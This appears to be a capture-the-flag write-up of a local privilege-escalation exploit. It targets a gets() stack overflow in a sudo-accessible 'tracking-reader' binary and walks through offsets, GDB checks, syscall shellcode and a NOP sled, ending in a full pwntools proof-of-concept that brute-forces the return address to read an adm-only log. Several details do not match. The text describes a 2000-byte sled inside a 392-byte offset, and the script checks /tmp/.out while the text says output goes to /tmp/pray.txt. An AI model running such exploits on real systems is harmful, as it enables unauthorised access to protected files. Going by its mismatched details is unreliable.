
# Vulnerability
---

## 1. Context & Setup

### Target Binary

```
/usr/sbin/tracking-reader   (rwxr-x--- root adm)
/usr/bin/cat_               (wrapper script)
```

### Wrapper Script `/usr/bin/cat_`

```bash
#!/bin/bash
/usr/bin/setarch -R /usr/sbin/tracking-reader
```

`setarch -R` sets the `ADDR_NO_RANDOMIZE` flag — **ASLR is disabled**.

### Sudo Permissions

```
(senior-dev : adm) NOPASSWD: /usr/bin/cat_
```

We can run:

```bash
sudo -g adm /usr/bin/cat_
```

### Binary Protections

|Protection|Status|Notes|
|---|---|---|
|ASLR|✗ Disabled|`setarch -R`|
|Stack Canary|✗ Disabled|`-fno-stack-protector`|
|NX (stack)|✗ Disabled|`-z execstack`|
|PIE|✗ Disabled|Fixed addresses|

All protections are off — ideal conditions for a classic stack overflow.

---

## 2. Vulnerability Analysis

### Vulnerable Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char *gets(char *s);

int main(int argc, char **argv) {
  char buffer[371];

  printf("ECorp user tracking log reader [MANAGEMENT ONLY]\n\n");

  setregid(4, 4);
  printf("Enter management password $> ");
  gets(buffer);                          // ← VULNERABLE
  if (strcmp(buffer, "<REDACTED>"))
    system("cat /var/log/tracking.log");
  return 0;
}
```


### What Can Be Overwritten with `gets()`

```
buffer[371] is allocated on the stack.
Writing beyond 371 bytes → overwrite saved RBP, then saved RIP.
Controlling RIP = controlling execution flow.
```

---

## 3. Memory Layout

### Stack Frame of `main()` — Before Overflow

```
Higher addresses
┌──────────────────────────────────────────┐
│                                          │
│        ... (caller frame)                │
│                                          │
├──────────────────────────────────────────┤ ← rbp + 0x08
│   saved RIP  │  0x00007ffff7df0ca8       │  ← return address to __libc_start_main
│              │  (8 bytes)                │
├──────────────────────────────────────────┤ ← rbp + 0x00
│   saved RBP  │  0x0000000000000001       │  ← caller's base pointer
│              │  (8 bytes)                │
├──────────────────────────────────────────┤
│                                          │
│         [gap / alignment]                │
│                                          │
├──────────────────────────────────────────┤ ← rbp - 0x180  (= rbp - 384)
│                                          │
│         char buffer[371]                 │  ← gets() writes HERE
│         (allocated: 384 bytes)           │
│                                          │
├──────────────────────────────────────────┤ ← rsp
│         (rest of stack frame)            │
└──────────────────────────────────────────┘
Lower addresses
```

### Stack Frame of `main()` — After Overflow

```
Higher addresses
┌──────────────────────────────────────────┐
│                                          │
│        ... (caller frame)                │
│                                          │
├──────────────────────────────────────────┤ ← rbp + 0x08
│  FAKE RIP   │  0x7fffffffe9a4            │  ← *** OVERWRITTEN ***
│             │  → points into NOP sled    │     CPU will jump here on ret
├──────────────────────────────────────────┤ ← rbp + 0x00
│  FAKE RBP   │  0x4242424242424242        │  ← *** OVERWRITTEN ***
│             │  ("BBBBBBBB")              │     don't care
├──────────────────────────────────────────┤
│   PADDING   │  0x42 * N bytes            │
├──────────────────────────────────────────┤
│  SHELLCODE  │  open/read/write syscalls  │
├──────────────────────────────────────────┤
│  NOP SLED   │  0x90 * 2000              │  ← gets() starts writing here
├──────────────────────────────────────────┤ ← rbp - 0x180
│             │                            │
└──────────────────────────────────────────┘
Lower addresses
```

---

## 4. Offset Calculation

From the `objdump` disassembly of `main()`:

```asm
1189:  55                push   rbp
118a:  48 89 e5          mov    rbp, rsp
118d:  48 81 ec 90 01    sub    $0x190, %rsp        ; allocate 0x190 bytes
...
11d3:  48 8d 85 80 fe ff ff   lea -0x180(%rbp), %rax  ; buffer at rbp-0x180
11da:  48 89 c7               mov %rax, %rdi
11dd:  e8 8e fe ff ff         call gets@plt
```

### Offset Breakdown

```
┌────────────────────────────────────────────────────────┐
│  buffer starts at:    rbp - 0x180  (= rbp - 384)       │
│  saved RBP at:        rbp + 0x00   (8 bytes)           │
│  saved RIP at:        rbp + 0x08   (8 bytes)           │
│                                                        │
│  offset = 0x180 + 8 = 384 + 8 = 392 bytes             │
│                                                        │
│  To overwrite RIP: write 392 bytes, then the address   │
└────────────────────────────────────────────────────────┘
```

### GDB Validation

```
(gdb) break *0x5555555551e2     ; breakpoint after gets()
(gdb) run < /tmp/payload.bin

(gdb) x/gx $rbp + 8
0x7fffffffeac8: 0x4343434343434343   ← 'CCCC' → RIP controlled ✓

(gdb) x/50bx $rbp - 0x180
0x7fffffffe940: 0x90 0x90 0x90 ...  ← NOP sled visible ✓
```

---

## 5. Exploitation Strategy

### Goal

Read `/var/log/preprod.log` which is only accessible by the `adm` group. The binary runs with `setregid(4, 4)` which sets the effective GID to `adm`.


---

## 6. Shellcode

We use direct Linux syscalls to avoid the dynamic linker entirely (calling `/bin/cat` via `execve` crashes due to the dynamic linker corrupting the stack during relocation).

### Syscall Flow

```
┌─────────────────────────────────────────────────────────┐
│                    SHELLCODE FLOW                       │
│                                                         │
│  sub rsp, 0x1000      ← reserve stack space for read   │
│         │                                               │
│         ▼                                               │
│  syscall open()       ← open("/var/log/preprod.log")   │
│    rax=2, rdi=path,     returns fd in rax               │
│    rsi=0, rdx=0                                         │
│         │                                               │
│         ▼                                               │
│  syscall read()       ← read(fd, rsp, 0x1000)          │
│    rax=0, rdi=fd,       reads file into stack           │
│    rsi=rsp, rdx=0x1000  returns bytes_read in rax       │
│         │                                               │
│         ▼                                               │
│  syscall write()      ← write(1, rsp, bytes_read)      │
│    rax=1, rdi=1,        writes to stdout                │
│    rsi=rsp, rdx=r10                                     │
│         │                                               │
│         ▼                                               │
│  syscall exit(0)      ← clean exit                      │
│    rax=60, rdi=0                                        │
└─────────────────────────────────────────────────────────┘
```

### Assembly

```asm
sub rsp, 0x1000          ; reserve space below shellcode for file contents

lea rdi, [rip + path]    ; rdi = pointer to "/var/log/preprod.log"
xor rsi, rsi             ; rsi = 0 (O_RDONLY)
xor rdx, rdx             ; rdx = 0
mov rax, 2               ; syscall: open
syscall
mov r9, rax              ; save fd

mov rdi, r9              ; rdi = fd
mov rsi, rsp             ; rsi = buffer (on stack)
mov rdx, 0x1000          ; rdx = read size
xor rax, rax             ; syscall: read
syscall
mov r10, rax             ; save bytes_read

mov rdi, 1               ; rdi = stdout
mov rsi, rsp             ; rsi = buffer
mov rdx, r10             ; rdx = bytes_read
mov rax, 1               ; syscall: write
syscall

xor rdi, rdi             ; rdi = 0
mov rax, 60              ; syscall: exit
syscall

path:
    .string "/var/log/preprod.log"
```

### Why `sub rsp, 0x1000`?

The shellcode pushes data and uses `rsp` as a read buffer. Without reserving space, the `read()` syscall would write the file contents on top of the shellcode itself, corrupting execution.

```
Without sub rsp, 0x1000 :         With sub rsp, 0x1000 :

  ┌──────────────┐                  ┌──────────────┐
  │  SHELLCODE   │ ← rsp            │  SHELLCODE   │
  │   ← read()  │                  ├──────────────┤
  │   CORRUPTS   │                  │   (0x1000    │
  │   ITSELF !   │                  │    bytes     │
  └──────────────┘                  │    free)     │
                                    ├──────────────┤
                                    │  file data   │ ← rsp (safe)
                                    └──────────────┘
```

---

## 7. NOP Sled

### The Problem

Even with ASLR disabled, the exact stack address of `tracking-reader` when launched via `sudo -g adm /usr/bin/cat_` differs slightly from what GDB shows, due to:

- `sudo` adding environment variables (despite `env_reset`)
- The `bash` → `setarch` → `tracking-reader` process chain
- Different argument vector lengths

### The Solution: NOP Sled

A NOP sled is a sequence of `0x90` (No Operation) instructions placed before the shellcode. The CPU slides through them harmlessly until it reaches the shellcode.

```
Payload in memory:

rbp-0x180
   │
   ▼
┌──────────────────────────────────────────────┐
│  \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90  │
│  \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90  │
│  \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90  │  ← 2000 bytes of NOPs
│         ...2000 bytes total...               │
│                                              │
│    ← jump can land ANYWHERE in here →        │
│                                              │
├──────────────────────────────────────────────┤
│          SHELLCODE (~80 bytes)               │  ← execution slides here
├──────────────────────────────────────────────┤
│          PADDING  (0x42 bytes)               │
├──────────────────────────────────────────────┤
│          FAKE RIP (6 bytes)                  │  → points to middle of NOP sled
└──────────────────────────────────────────────┘
```

### Why 6 bytes for RIP?

On x86-64, addresses are 8 bytes but only 6 are significant (the top 2 bytes of stack addresses are always `0x00 00`). Writing 6 bytes avoids embedding null bytes at known positions, which `gets()` does not care about — but it keeps the payload cleaner.

### Target Address

We aim for the **middle** of the NOP sled to maximize tolerance in both directions:

```
buffer_addr = 0x7fffffffe940      (found via GDB)
nop_middle  = buffer_addr + 1000  = 0x7fffffffe940 + 0x3E8
            = 0x7fffffffeD28      (approximate center)
```

---

## 8. Address Brute-Force

Since the exact address varies between GDB and the real `sudo` execution, we brute-force a range of ±`0x2000` bytes around our estimated center, stepping by `0x10`.

```
CENTER = 0x7fffffffe980

Test order (sorted by |delta|):

  delta=0x0000  → addr = 0x7fffffffe980   ← most likely
  delta=0x0010  → addr = 0x7fffffffe990
  delta=-0x0010 → addr = 0x7fffffffe970
  delta=0x0020  → addr = 0x7fffffffe9a0
  delta=-0x0020 → addr = 0x7fffffffe960
  ...
  delta=0x2000  → addr = 0x7fffffffE980 + 0x2000
  delta=-0x2000 → addr = 0x7fffffffe980 - 0x2000
```

For each candidate address, the full payload is:

```
[ NOP * 2000 ][ SHELLCODE ][ PADDING ][ addr[:6] ][\n]
      ↑                                    ↑
  landing zone                        overwrites RIP
```

---

## 9. Execution Flow

### Complete Attack Chain

```
┌──────────────────────────────────────────────────────────────┐
│                    ATTACK CHAIN                              │
└──────────────────────────────────────────────────────────────┘

  exploit.py
      │
      │  1. Assemble shellcode (pwntools asm)
      │  2. Build payload: [NOP][SC][PAD][ADDR]
      │  3. Write to /tmp/xxxx.bin
      │
      ▼
  sudo -g adm /usr/bin/cat_ < /tmp/xxxx.bin
      │
      ▼
  bash (cat_) → setarch -R → tracking-reader
                                    │
                                    │  setregid(4, 4)   ← gains adm group
                                    │  gets(buffer)     ← reads our payload
                                    │
                                    │  ┌─────────────────────────────┐
                                    │  │ buffer filled:              │
                                    │  │  [NOP x2000][SC][PAD][ADDR] │
                                    │  └─────────────────────────────┘
                                    │
                                    │  strcmp() fails → system() called
                                    │  (prints /var/log/tracking.log)
                                    │
                                    │  return 0
                                    │
                                    ▼
                               leave instruction
                                    │
                                    │  mov rsp, rbp   (rsp = original rbp)
                                    │  pop rbp        (rbp = our fake 0x42...)
                                    │
                                    ▼
                               ret instruction
                                    │
                                    │  pop rip = 0x7fffffffe9xx  ← our addr
                                    │
                                    ▼
                         ┌─────────────────────┐
                         │   NOP sled (0x90)   │
                         │   nop nop nop ...   │
                         │         ↓           │
                         │   SHELLCODE         │
                         │         ↓           │
                         │   open(preprod.log) │
                         │   read(fd, rsp, ..) │
                         │   write(1, rsp, ..) │ → output to stdout
                         │   exit(0)           │
                         └─────────────────────┘
                                    │
                                    ▼
                         exploit.py captures stdout
                         writes to /tmp/pray.txt
                         prints flag 🏁
```

### Why the Output Goes to `/tmp/pray.txt`

The sudo `use_pty` option allocates a pseudo-terminal, which prevents `subprocess.PIPE` from capturing the output directly in Python. By redirecting with `> /tmp/pray.txt` at the shell level, we bypass the PTY and can read the file afterwards.

---

## Summary

|Step|Action|Key Detail|
|---|---|---|
|1|Identify `gets()`|No bounds check → arbitrary write|
|2|Calculate offset|`0x180 + 8 = 392` bytes to RIP|
|3|Craft NOP sled|2000 × `\x90` for address tolerance|
|4|Write shellcode|Direct syscalls: open/read/write|
|5|Overwrite RIP|6-byte little-endian stack address|
|6|Brute-force address|±0x2000 around GDB-observed address|
|7|Capture output|Shell redirect → `/tmp/pray.txt`|


# PoC
---

```python
#!/usr/bin/env python3
from pwn import *
import subprocess, sys, tempfile, os

context.arch = 'amd64'
context.os   = 'linux'

shellcode = asm('''
    sub rsp, 0x1000

    lea rdi, [rip + path]
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    mov r9, rax
    mov rdi, r9
    mov rsi, rsp
    mov rdx, 0x1000
    xor rax, rax
    syscall

    mov r10, rax
    mov rdi, 1
    mov rsi, rsp
    mov rdx, r10
    mov rax, 1
    syscall

    xor rdi, rdi
    mov rax, 60
    syscall
path:
    .string "/var/log/preprod.log"
''')

OFFSET  = 392
sled    = b'\x90' * (OFFSET - len(shellcode))
CENTER  = 0x7fffffffe980
SPAN    = 0x2000
STEP    = 0x10

possibilities = sorted(range(-SPAN, SPAN + 1, STEP), key=abs)
for unit in possibilities:
    addr = CENTER + unit
    rip  = addr.to_bytes(8, 'little')[:6]

    if b'\x0a' in rip:
        continue

    payload = sled + shellcode + rip + b'\n'

    with tempfile.NamedTemporaryFile(delete=False) as f:
        f.write(payload)
        fname = f.name

    try:
        subprocess.run(f'sudo -g adm /usr/bin/cat_ < {fname}',
                       shell=True, timeout=3,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if os.path.exists('/tmp/.out') and os.path.getsize('/tmp/.out') > 0:
            print(f'[+] {hex(addr)}')
            print(open('/tmp/.out').read())
            sys.exit(0)

    except subprocess.TimeoutExpired:
        pass
    finally:
        os.unlink(fname)

print('[-] Range exhausted.')
```

